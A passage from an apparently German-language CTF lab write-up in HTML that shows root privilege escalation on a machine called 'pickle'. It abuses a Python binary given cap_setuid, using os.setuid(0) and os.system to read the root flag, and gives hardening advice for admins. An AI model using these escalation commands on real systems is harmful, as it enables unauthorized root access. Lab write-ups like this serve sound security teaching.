+<span class="command">/home/mark/python2 = cap_setuid+ep</span>
+/usr/bin/ping = cap_net_raw+ep
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Der Befehl `getcap -r / 2>/dev/null` sucht rekursiv im gesamten Dateisystem nach Dateien mit gesetzten Linux Capabilities. Das Ergebnis zeigt, dass die Datei `/home/mark/python2` die Capability `cap_setuid+ep` besitzt. `cap_setuid` erlaubt einem Prozess, seine User ID (UID) zu ändern. `+ep` bedeutet, dass die Capability sowohl "effective" als auch "permitted" ist.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das ist der entscheidende Fund für die Root-Eskalation! Ein Python-Interpreter mit der `cap_setuid`-Capability kann dazu missbraucht werden, die UID auf 0 (root) zu setzen und somit Root-Rechte zu erlangen.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Das `/home/mark/python2`-Binary ausführen. Innerhalb des Python-Interpreters das `os`-Modul importieren und `os.setuid(0)` aufrufen. Anschließend Befehle als root ausführen (z.B. eine Root-Shell starten oder `/root/root.txt` lesen).<br>
+                **Empfehlung (Admin):** Niemals Capabilities wie `cap_setuid` an Skript-Interpreter (Python, Perl, Bash etc.) oder generell an Programme vergeben, die nicht explizit dafür ausgelegt und gehärtet sind. Capabilities sollten nur sehr gezielt und mit Bedacht eingesetzt werden. Diese Capability von `/home/mark/python2` sofort entfernen (`setcap cap_setuid-ep /home/mark/python2`). Überprüfen, warum diese Capability gesetzt wurde.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">mark@pickle:~$ <span class="command">/home/mark/python2</span></div>
+                    <pre>
+Python 2.7.16 (default, Oct 10 2019, 22:02:15)
+[GCC 8.3.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+<span class="prompt">>>></span> <span class="command">import os</span>
+<span class="prompt">>>></span> <span class="command">os.setuid(0)</span> <span class="comment"># UID auf root setzen</span>
+<span class="prompt">>>></span> <span class="command">os.system("cat /root/root.txt")</span> <span class="comment"># Befehl als root ausführen</span>
+<span class="password">7a32c9739cc63ed983ae01af2577c01c</span>
+0 <span class="comment"># Rückgabewert von os.system</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der Python-Interpreter `/home/mark/python2` wird gestartet. Das `os`-Modul wird importiert. `os.setuid(0)` wird aufgerufen; da das Binary die `cap_setuid`-Capability hat, ist dieser Aufruf erfolgreich und der Prozess läuft nun mit `UID=0`. Anschließend wird `os.system("cat /root/root.txt")` ausgeführt, was die Root-Flag erfolgreich ausgibt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Privilege Escalation zu Root erfolgreich abgeschlossen! Die `cap_setuid`-Capability des Python-Binaries wurde erfolgreich ausgenutzt.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Root-Flag dokumentieren. Ggf. eine stabile Root-Shell starten (`os.system('/bin/bash')`).<br>
+                **Empfehlung (Admin):** Die `cap_setuid`-Capability vom Python-Binary entfernen. System auf weitere Fehlkonfigurationen bei Capabilities oder SUID-Binaries prüfen.
+            </p>
+
+        </section>
+
+        <!-- Angepasster Flags-Abschnitt -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/mark/user.txt</div> <!-- Pfad aus ls übernommen -->
+                     <div class="flag-value"><span class="password">e25fd1b9248d1786551e3412adc74f6f</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div> <!-- Aus Exploit-Schritt übernommen -->
+                     <div class="flag-value"><span class="password">7a32c9739cc63ed983ae01af2577c01c</span></div>
+                 </div>
+             </div>
+         </section>
+
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap/Logs extrahiert -->
+        <p>Berichtsdatum: 19. Oktober 2022</p>
+    </footer>
+</body>
+</html>
